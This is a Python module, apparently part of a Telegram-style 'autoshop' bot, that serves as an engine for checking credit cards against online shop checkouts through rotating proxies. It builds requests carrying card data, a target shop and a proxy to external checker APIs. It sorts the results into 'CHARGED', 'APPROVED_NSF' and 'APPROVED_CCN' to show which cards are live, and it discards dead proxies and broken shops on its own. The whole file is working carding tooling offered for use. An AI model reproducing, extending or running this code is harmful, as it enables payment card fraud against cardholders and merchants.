"""
check_engine.py — KIORA AUTOSHOPI
Multi-API engine: JSON state, URL building, API requests, response parsing,
and auto-removal flags for site errors and dead proxies.

Dev: OGGY (@OggyProo)
"""

import json
import asyncio
import aiohttp
import os
import logging
from typing import Optional

logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

OWNER_NAME     = "𝑶𝑮𝑮𝒀 𝑷𝑹𝑶𝑶"
OWNER_USERNAME = "OggyProo"
OWNER_ID       = 8919487892
KEY_PREFIX     = "OGGY-PROO"

ENDPOINTS_FILE = "api_endpoints.json"
API_TIMEOUT    = 90

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION KEYWORDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CHARGED_KEYWORDS = [
    "CHARGE", "PAID", "SUCCESS", "ORDER_PLACED", "ORDER_PAID",
    "PAYMENT_SUCCESSFULL", "CAPTURED", "COMPLETED", "FULFILLED",
]

NSF_KEYWORDS = ["INSUFFICIENT_FUNDS"]

CCN_KEYWORDS = ["INCORRECT_CVC", "INVALID_CVC", "CVV"]

SITE_ERROR_KEYWORDS = [
    "NO_PRODUCTS", "PRODUCTS_NOT_FOUND", "PAYMENTS_ZONE_NOT_FOUND",
    "INVALID_SHOP",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FLAGS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FLAG_CHARGED     = "CHARGED"
FLAG_APPROVED    = "APPROVED"
FLAG_APPROVED_NSF = "APPROVED_NSF"
FLAG_APPROVED_CCN = "APPROVED_CCN"
FLAG_SITE_ERROR  = "SITE_ERROR"       # → triggers site auto-removal
FLAG_DECLINED    = "DECLINED"
FLAG_PROXY_DEAD  = "PROXY_DEAD"       # → triggers proxy auto-removal
FLAG_API_ERROR   = "API_ERROR"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENDPOINT STATE  (JSON load / save / mutate)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _load_state() -> dict:
    """Load api_endpoints.json.  Returns default if missing."""
    if not os.path.exists(ENDPOINTS_FILE):
        default = {"endpoints": [], "active_idx": 0}
        _save_state(default)
        return default
    with open(ENDPOINTS_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def _save_state(state: dict) -> None:
    with open(ENDPOINTS_FILE, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2)


def get_active_endpoint() -> Optional[dict]:
    """Return the currently active endpoint dict, or None if list is empty."""
    state = _load_state()
    endpoints = state.get("endpoints", [])
    idx = state.get("active_idx", 0)
    if not endpoints:
        return None
    idx = max(0, min(idx, len(endpoints) - 1))
    return endpoints[idx]


def set_active_index(idx: int) -> bool:
    """Switch active API by index.  Returns False if index out of range."""
    state = _load_state()
    if idx < 0 or idx >= len(state.get("endpoints", [])):
        return False
    state["active_idx"] = idx
    _save_state(state)
    return True


def add_endpoint(url: str, key: Optional[str] = None) -> int:
    """Append a new endpoint.  Returns its new index."""
    state = _load_state()
    state["endpoints"].append({"url": url.rstrip("/"), "key": key or None})
    _save_state(state)
    return len(state["endpoints"]) - 1


def remove_endpoint(identifier) -> bool:
    """
    Remove endpoint by integer index or by URL string.
    Adjusts active_idx if necessary.  Returns True on success.
    """
    state = _load_state()
    endpoints = state.get("endpoints", [])
    target = None

    if isinstance(identifier, int):
        if 0 <= identifier < len(endpoints):
            target = identifier
    else:
        for i, ep in enumerate(endpoints):
            if ep["url"] == identifier.rstrip("/"):
                target = i
                break

    if target is None:
        return False

    endpoints.pop(target)
    state["endpoints"] = endpoints

    # Keep active_idx valid
    if state["active_idx"] >= len(endpoints):
        state["active_idx"] = max(0, len(endpoints) - 1)

    _save_state(state)
    return True


def list_endpoints() -> list:
    """Return list of (index, url, key, is_active) tuples."""
    state = _load_state()
    active = state.get("active_idx", 0)
    result = []
    for i, ep in enumerate(state.get("endpoints", [])):
        result.append((i, ep["url"], ep.get("key"), i == active))
    return result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# URL BUILDER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def build_request_url(site: str, cc: str, proxy: str) -> Optional[str]:
    """
    Build the full request URL for the active API.
    All APIs get ?site=&cc=&proxy=; if endpoint has a key, appends &key=.
    Returns None if no endpoints configured.
    """
    ep = get_active_endpoint()
    if ep is None:
        return None

    url = f"{ep['url']}?site={site}&cc={cc}&proxy={proxy}"
    if ep.get("key"):
        url += f"&key={ep['key']}"
    return url


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_response(data: dict) -> dict:
    """
    Classify an API JSON response into a flag + metadata.

    Returns:
        {
            "flag":    FLAG_* constant,
            "message": str,
            "charged": bool,
            "remove_site":  bool,   # True → caller must remove site from sites.txt
            "remove_proxy": bool,   # True → caller must remove proxy
        }
    """
    # Normalise — APIs use different casing
    success_raw = data.get("Status", data.get("success", data.get("status", False)))
    if isinstance(success_raw, str):
        success = success_raw.lower() in ("true", "1", "yes")
    else:
        success = bool(success_raw)

    message = str(
        data.get("message",
        data.get("Message",
        data.get("Response",
        data.get("response", ""))))
    ).strip()

    msg_up = message.upper()

    # 1. Site error — always remove regardless of success flag
    for kw in SITE_ERROR_KEYWORDS:
        if kw in msg_up:
            return {
                "flag": FLAG_SITE_ERROR,
                "message": message,
                "charged": False,
                "remove_site": True,
                "remove_proxy": False,
            }

    # 2. Need success=True for positive classifications
    if success:
        # Charged
        for kw in CHARGED_KEYWORDS:
            if kw in msg_up:
                return {
                    "flag": FLAG_CHARGED,
                    "message": message,
                    "charged": True,
                    "remove_site": False,
                    "remove_proxy": False,
                }

        # NSF
        for kw in NSF_KEYWORDS:
            if kw in msg_up:
                return {
                    "flag": FLAG_APPROVED_NSF,
                    "message": message,
                    "charged": False,
                    "remove_site": False,
                    "remove_proxy": False,
                }

        # CCN
        for kw in CCN_KEYWORDS:
            if kw in msg_up:
                return {
                    "flag": FLAG_APPROVED_CCN,
                    "message": message,
                    "charged": False,
                    "remove_site": False,
                    "remove_proxy": False,
                }

        # Generic approved
        return {
            "flag": FLAG_APPROVED,
            "message": message,
            "charged": False,
            "remove_site": False,
            "remove_proxy": False,
        }

    # 3. Declined / dead
    return {
        "flag": FLAG_DECLINED,
        "message": message,
        "charged": False,
        "remove_site": False,
        "remove_proxy": False,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HTTP REQUEST
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def call_api(site: str, cc: str, proxy: str) -> dict:
    """
    Make the API call, parse the response, and return a result dict:
        {
            "flag":         FLAG_* constant,
            "message":      str,
            "charged":      bool,
            "remove_site":  bool,
            "remove_proxy": bool,
            "raw":          dict | None,
        }
    On proxy/connection failure returns FLAG_PROXY_DEAD with remove_proxy=True.
    """
    url = build_request_url(site, cc, proxy)
    if url is None:
        return {
            "flag": FLAG_API_ERROR,
            "message": "No API endpoints configured.",
            "charged": False,
            "remove_site": False,
            "remove_proxy": False,
            "raw": None,
        }

    timeout = aiohttp.ClientTimeout(total=API_TIMEOUT, connect=15, sock_read=API_TIMEOUT)

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=timeout, ssl=False) as resp:
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    text = await resp.text()
                    try:
                        import json as _j
                        data = _j.loads(text)
                    except Exception:
                        return {
                            "flag": FLAG_API_ERROR,
                            "message": f"JSON parse error (HTTP {resp.status})",
                            "charged": False,
                            "remove_site": False,
                            "remove_proxy": False,
                            "raw": None,
                        }

                result = parse_response(data)
                result["raw"] = data
                return result

    except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError) as e:
        logger.warning(f"[check_engine] Proxy error ({proxy}): {e}")
        return {
            "flag": FLAG_PROXY_DEAD,
            "message": f"Proxy error: {str(e)[:80]}",
            "charged": False,
            "remove_site": False,
            "remove_proxy": True,
            "raw": None,
        }

    except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError) as e:
        err = str(e).lower()
        is_proxy_fault = any(k in err for k in ("proxy", "tunnel", "407", "connect"))
        return {
            "flag": FLAG_PROXY_DEAD if is_proxy_fault else FLAG_API_ERROR,
            "message": f"Connection error: {str(e)[:80]}",
            "charged": False,
            "remove_site": False,
            "remove_proxy": is_proxy_fault,
            "raw": None,
        }

    except asyncio.TimeoutError:
        return {
            "flag": FLAG_PROXY_DEAD,
            "message": "Timeout — proxy likely dead.",
            "charged": False,
            "remove_site": False,
            "remove_proxy": True,
            "raw": None,
        }

    except Exception as e:
        logger.error(f"[check_engine] Unexpected error: {e}")
        return {
            "flag": FLAG_API_ERROR,
            "message": f"Unexpected error: {str(e)[:80]}",
            "charged": False,
            "remove_site": False,
            "remove_proxy": False,
            "raw": None,
        }
